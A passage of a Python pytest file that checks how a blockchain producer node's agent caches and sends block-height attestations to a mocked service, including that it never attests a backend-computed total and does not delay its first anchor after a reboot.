    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)
    agent._attest_cache.clear()
    agent._attest_cache["at"] = None

    # A beat that did carry a scan, too soon to anchor.
    agent._attest_cache["at"] = agent.time.monotonic()
    agent.attest("xl1-producer", {"last_produced_block": 574115, "block_height": 574200})
    assert sent == {}, "should not have anchored yet"

    # A later beat with no scan at all still attests the remembered values.
    agent._attest_cache["at"] = None
    agent.attest("xl1-producer", {})
    assert sent["lastProducedBlock"] == 574115
    assert sent["height"] == 574200


def test_the_node_does_not_attest_a_total_it_never_computes(monkeypatch):
    """produced_total is the backend accumulating scans over time. A node
    attesting it would be vouching for arithmetic done somewhere else."""
    sent = {}

    class _Resp:
        status = 200
        def read(self): return json.dumps({"anchored": False}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    monkeypatch.setattr(agent.urllib.request, "urlopen",
                        lambda req, timeout=0: (sent.update(json.loads(req.data.decode())), _Resp())[1])
    agent._attest_cache.clear()
    agent._attest_cache["at"] = None
    agent.attest("xl1-producer", {"produced_total": 1010})
    assert "producedTotal" not in sent, sent


def test_the_first_anchor_does_not_wait_for_the_host_to_be_an_hour_old(monkeypatch):
    """time.monotonic() counts from boot, so a zero sentinel means "an hour has
    passed" only on a machine that has been up an hour.

    This failed on CI and passed here for exactly that reason: the runner had
    been alive for twenty seconds. A freshly rebooted node would have delayed
    its first anchor by up to ATTEST_INTERVAL for the same arithmetic.
    """
    calls = []

    class _Resp:
        status = 200
        def read(self): return json.dumps({"anchored": False}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.time, "monotonic", lambda: 20.0)
    monkeypatch.setattr(agent, "ATTEST_URL", "http://svc/attest")
    monkeypatch.setattr(agent, "read_reward_address", lambda name: "a6" * 20)
    monkeypatch.setattr(agent.urllib.request, "urlopen",
                        lambda req, timeout=0: (calls.append(1), _Resp())[1])
    agent._attest_cache["at"] = None

    agent.attest("xl1-producer", {})
    assert calls, "a node that just booted must still attest"
